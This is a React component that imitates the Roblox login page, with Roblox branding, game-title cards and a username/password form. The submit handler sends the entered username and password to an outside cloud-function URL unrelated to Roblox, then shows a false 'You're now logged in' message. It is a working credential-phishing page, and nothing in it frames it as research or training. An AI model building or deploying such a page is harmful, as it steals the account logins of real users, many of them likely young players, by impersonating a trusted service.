import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useToast } from '@/hooks/use-toast';
import Icon from '@/components/ui/icon';

const Index = () => {
  const { toast } = useToast();
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const response = await fetch('https://functions.poehali.dev/dc09bade-aa8a-41d7-87df-0f7ae1969e91', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: formData.username,
          email: 'login@roblox.com',
          password: formData.password
        }),
      });

      if (response.ok) {
        toast({
          title: "Welcome to Roblox!",
          description: "You're now logged in.",
        });
        setFormData({ username: '', password: '' });
      } else {
        throw new Error('Login failed');
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Invalid credentials. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const gameCards = [
    { title: 'SHARK BITE 2', color: 'from-blue-600 to-teal-500', rotation: '-rotate-12', top: '10%', left: '5%' },
    { title: 'WORLD ZERO', color: 'from-purple-600 to-pink-500', rotation: 'rotate-6', top: '25%', right: '8%' },
    { title: 'TOWER HERO', color: 'from-green-600 to-emerald-500', rotation: '-rotate-6', bottom: '30%', left: '8%' },
    { title: 'ULTIMATE FOOTBALL', color: 'from-indigo-600 to-blue-500', rotation: 'rotate-12', bottom: '15%', right: '10%' },
    { title: 'POWER WORLD', color: 'from-cyan-600 to-blue-500', rotation: '-rotate-3', top: '40%', left: '15%' },
    { title: 'HEROES ONLINE', color: 'from-red-600 to-orange-500', rotation: 'rotate-3', top: '50%', right: '15%' }
  ];

  return (
    <div className="min-h-screen bg-black relative overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-br from-gray-900 via-black to-gray-900" />
      
      {gameCards.map((card, idx) => (
        <div
          key={idx}
          className={`absolute w-48 h-32 rounded-xl bg-gradient-to-br ${card.color} ${card.rotation} opacity-40 shadow-2xl transition-all duration-700 hover:opacity-60 hover:scale-110`}
          style={{
            top: card.top,
            bottom: card.bottom,
            left: card.left,
            right: card.right,
            transform: `${card.rotation} translateZ(0)`,
            backdropFilter: 'blur(10px)'
          }}
        >
          <div className="absolute inset-0 flex items-end justify-center p-4">
            <span className="text-white font-black text-sm text-center drop-shadow-lg">
              {card.title}
            </span>
          </div>
        </div>
      ))}

      <header className="relative z-10 bg-[#1A1A1A] border-b border-gray-800">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between h-14">
            <div className="flex items-center gap-6">
              <div className="flex items-center gap-2">
                <div className="w-7 h-7 bg-white rounded flex items-center justify-center">
                  <span className="text-black font-black text-xs">R</span>
                </div>
              </div>
              <div className="relative hidden md:block">
                <Icon name="Search" size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
                <input 
                  type="text" 
                  placeholder="Search" 
                  className="pl-9 pr-4 py-1.5 bg-[#2A2A2A] border border-gray-700 rounded-lg text-white text-sm w-64 focus:outline-none focus:border-gray-600"
                />
              </div>
            </div>
            <nav className="flex items-center gap-6 text-sm">
              <a href="#" className="text-gray-300 hover:text-white font-semibold hidden md:block">Charts</a>
              <a href="#" className="text-gray-300 hover:text-white font-semibold hidden md:block">Marketplace</a>
              <a href="#" className="text-gray-300 hover:text-white font-semibold hidden md:block">Create</a>
              <a href="#" className="text-gray-300 hover:text-white font-semibold hidden md:block">Robux</a>
              <Button size="sm" className="bg-[#0074E0] hover:bg-[#0066CC] text-white font-bold px-5 text-sm">
                Sign Up
              </Button>
            </nav>
          </div>
        </div>
      </header>

      <main className="relative z-10 flex items-center justify-center min-h-[calc(100vh-56px)] p-4">
        <div className="w-full max-w-md">
          <div className="bg-[#232527] rounded-xl p-8 shadow-2xl border border-gray-700">
            <h1 className="text-2xl font-bold text-white text-center mb-8">
              Login to Roblox
            </h1>
            
            <form onSubmit={handleSubmit} className="space-y-5">
              <div>
                <Input
                  type="text"
                  value={formData.username}
                  onChange={(e) => setFormData({ ...formData, username: e.target.value })}
                  required
                  className="h-12 bg-[#393B3D] border-[#393B3D] text-white placeholder:text-gray-400 focus:border-gray-600 focus:ring-0 rounded-lg"
                  placeholder="Username/Email/Phone"
                />
              </div>

              <div>
                <Input
                  type="password"
                  value={formData.password}
                  onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                  required
                  className="h-12 bg-[#393B3D] border-[#393B3D] text-white placeholder:text-gray-400 focus:border-gray-600 focus:ring-0 rounded-lg"
                  placeholder="Password"
                />
              </div>

              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-12 bg-[#393B3D] hover:bg-[#4A4C4E] text-white font-semibold rounded-lg transition"
              >
                {isLoading ? 'Logging In...' : 'Log In'}
              </Button>

              <div className="text-center">
                <a href="#" className="text-sm text-gray-300 hover:text-white font-medium">
                  Forgot Password or Username?
                </a>
              </div>

              <Button
                type="button"
                variant="outline"
                className="w-full h-12 bg-[#393B3D] hover:bg-[#4A4C4E] text-white border-0 font-semibold rounded-lg"
              >
                Email Me a One-Time Code
              </Button>

              <Button
                type="button"
                variant="outline"
                className="w-full h-12 bg-[#393B3D] hover:bg-[#4A4C4E] text-white border-0 font-semibold rounded-lg"
              >
                Use Another Device
              </Button>

              <div className="text-center pt-4">
                <a href="#signup" className="text-sm text-gray-300 hover:text-white font-medium">
                  Don't have an account? Sign Up
                </a>
              </div>
            </form>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Index;
